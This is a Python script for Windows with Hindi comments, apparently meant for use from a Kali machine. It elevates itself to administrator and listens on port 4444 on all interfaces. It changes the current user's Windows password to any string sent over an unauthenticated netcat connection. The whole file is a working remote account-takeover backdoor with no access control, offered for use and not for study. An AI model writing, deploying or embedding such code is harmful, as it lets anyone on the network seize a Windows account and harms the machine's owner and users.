# File name: test.py
# Windows par save karo

import socket
import subprocess
import os
import sys
import ctypes
import time

# FORCE ADMIN WITH VISIBLE WINDOW
def force_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
    except:
        pass
    
    # Admin mode mein visible window ke saath restart
    script = os.path.abspath(sys.argv[0])
    ctypes.windll.shell32.ShellExecuteW(
        None, 
        "runas", 
        sys.executable, 
        f'"{script}" --admin', 
        None, 
        1  # 1 = normal window dikhega
    )
    sys.exit()

# Check for admin flag
if '--admin' not in ' '.join(sys.argv):
    force_admin()

# Ab admin mode mein code
PORT = 4444
username = os.getenv('USERNAME')

def get_ip():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return "0.0.0.0"

def change_password(new_pass):
    """Password change karo"""
    try:
        print(f"\n[*] Changing password for {username} to: {new_pass}")
        
        # net user command
        result = subprocess.run(
            ['net', 'user', username, new_pass],
            capture_output=True,
            text=True,
            shell=True
        )
        
        if result.returncode == 0:
            print("[✓] Password changed successfully!")
            return True, "Success"
        else:
            print(f"[✗] Failed: {result.stderr}")
            return False, result.stderr
    except Exception as e:
        print(f"[!] Error: {e}")
        return False, str(e)

# Clear screen
os.system('cls' if os.name == 'nt' else 'clear')

# Banner
ip = get_ip()
print(f"""
╔══════════════════════════════════════════════════════════╗
║                 WINDOWS PASSWORD CHANGER                 ║
║                    (ADMIN MODE)                          ║
╠══════════════════════════════════════════════════════════╣
║  Windows IP: {ip:<35} ║
║  Port: {PORT:<45} ║
║  User: {username:<45} ║
║  Status: RUNNING (ADMIN MODE)                            ║
╚══════════════════════════════════════════════════════════╝
""")
print(f"[*] Kali command: nc {ip} {PORT}")
print("[*] Waiting for connections...\n")

# Server loop
while True:
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', PORT))
        server.listen(1)
        
        print(f"[{time.strftime('%H:%M:%S')}] Listening...")
        conn, addr = server.accept()
        print(f"[+] Connected from: {addr[0]}")
        
        data = conn.recv(1024).decode().strip()
        print(f"[+] Password received: {data}")
        
        if data:
            success, message = change_password(data)
            
            if success:
                conn.send(b"SUCCESS: Password updated")
                print("[✓] Password update complete!")
            else:
                conn.send(b"ERROR: Password change failed")
                print("[✗] Password update failed")
        
        conn.close()
        server.close()
        print("-"*60)
        
    except Exception as e:
        print(f"[!] Error: {e}")
        time.sleep(2)
